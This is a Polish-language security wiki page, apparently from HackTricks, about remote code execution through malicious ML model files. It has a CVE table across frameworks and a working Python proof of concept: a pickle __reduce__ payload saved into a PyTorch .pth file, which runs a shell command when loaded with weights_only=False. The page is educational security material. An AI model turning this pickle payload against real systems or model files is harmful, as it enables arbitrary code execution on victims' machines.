# Modele RCE

{{#include ../banners/hacktricks-training.md}}

## Ładowanie modeli do RCE

Modele uczenia maszynowego są zazwyczaj udostępniane w różnych formatach, takich jak ONNX, TensorFlow, PyTorch itp. Modele te mogą być ładowane na maszyny deweloperów lub systemy produkcyjne w celu ich wykorzystania. Zazwyczaj modele nie powinny zawierać złośliwego kodu, ale są przypadki, w których model może być użyty do wykonania dowolnego kodu w systemie jako zamierzona funkcja lub z powodu luki w bibliotece ładującej model.

W momencie pisania, oto kilka przykładów tego typu luk:

| **Framework / Narzędzie**   | **Luka (CVE, jeśli dostępne)**                                                                                               | **Wektor RCE**                                                                                                                         | **Odnośniki**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Niebezpieczna deserializacja w* `torch.load` **(CVE-2025-32434)**                                                          | Złośliwy pickle w punkcie kontrolnym modelu prowadzi do wykonania kodu (obejście zabezpieczenia `weights_only`)                         | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + złośliwe pobieranie modelu powoduje wykonanie kodu; deserializacja RCE w API zarządzania                                         | |
| **TensorFlow/Keras**        | **CVE-2021-37678** (niebezpieczny YAML) <br> **CVE-2024-3660** (Keras Lambda)                                               | Ładowanie modelu z YAML używa `yaml.unsafe_load` (wykonanie kodu) <br> Ładowanie modelu z warstwą **Lambda** uruchamia dowolny kod Pythona | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (parsing TFLite)                                                                                          | Opracowany model `.tflite` wywołuje przepełnienie całkowite → uszkodzenie sterty (potencjalne RCE)                                     | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Ładowanie modelu za pomocą `joblib.load` wykonuje pickle z ładunkiem `__reduce__` atakującego                                         | |
| **NumPy** (Python)          | **CVE-2019-6446** (niebezpieczne `np.load`) *kwestionowane*                                                                  | Domyślnie `numpy.load` pozwalało na ładowanie zserializowanych tablic obiektów – złośliwe `.npy/.npz` wywołuje wykonanie kodu          | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (przechodzenie katalogów) <br> **CVE-2024-5187** (przechodzenie tar)                                      | Ścieżka zewnętrznych wag modelu ONNX może uciec z katalogu (odczyt dowolnych plików) <br> Złośliwy model ONNX tar może nadpisać dowolne pliki (prowadząc do RCE) | |
| ONNX Runtime (ryzyko projektowe) | *(Brak CVE)* Niestandardowe operacje ONNX / przepływ sterowania                                                            | Model z niestandardowym operatorem wymaga załadowania natywnego kodu atakującego; złożone grafy modelu nadużywają logiki do wykonania niezamierzonych obliczeń | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (przechodzenie ścieżek)                                                                                   | Użycie API ładowania modelu z włączonym `--model-control` pozwala na przechodzenie ścieżek względnych do zapisywania plików (np. nadpisanie `.bashrc` dla RCE) | |
| **GGML (format GGUF)**      | **CVE-2024-25664 … 25668** (wiele przepełnień sterty)                                                                        | Źle sformatowany plik modelu GGUF powoduje przepełnienia bufora sterty w parserze, umożliwiając wykonanie dowolnego kodu na systemie ofiary | |
| **Keras (starsze formaty)** | *(Brak nowego CVE)* Model Keras H5 w wersji legacy                                                                            | Złośliwy model HDF5 (`.h5`) z kodem warstwy Lambda nadal wykonuje się podczas ładowania (tryb bezpieczeństwa Keras nie obejmuje starego formatu – „atak degradacyjny”) | |
| **Inne** (ogólnie)          | *Wada projektowa* – Serializacja Pickle                                                                                      | Wiele narzędzi ML (np. formaty modeli oparte na pickle, Python `pickle.load`) wykona dowolny kod osadzony w plikach modeli, chyba że zostanie to złagodzone | |

Ponadto istnieją modele oparte na python pickle, takie jak te używane przez [PyTorch](https://github.com/pytorch/pytorch/security), które mogą być użyte do wykonania dowolnego kodu w systemie, jeśli nie są ładowane z `weights_only=True`. Tak więc, każdy model oparty na pickle może być szczególnie podatny na tego typu ataki, nawet jeśli nie są wymienione w powyższej tabeli.

Przykład:

- Utwórz model:
```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
def __reduce__(self):
# This code will be executed when unpickled (e.g., on model.load_state_dict)
return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```
- Załaduj model:
```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
def __init__(self):
super().__init__()
self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```
{{#include ../banners/hacktricks-training.md}}
